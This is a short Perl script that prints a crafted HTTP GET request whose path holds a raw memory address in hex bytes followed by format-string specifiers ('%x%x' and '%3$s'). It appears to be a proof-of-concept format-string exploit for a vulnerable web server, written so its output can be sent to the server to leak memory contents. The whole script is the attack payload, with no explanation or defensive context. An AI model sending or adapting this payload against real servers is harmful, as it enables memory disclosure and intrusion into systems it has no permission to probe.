#!/usr/bin/perl

use strict;

print "GET" . "\x01\x80\x04\x08" . '%x%x///%3$s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
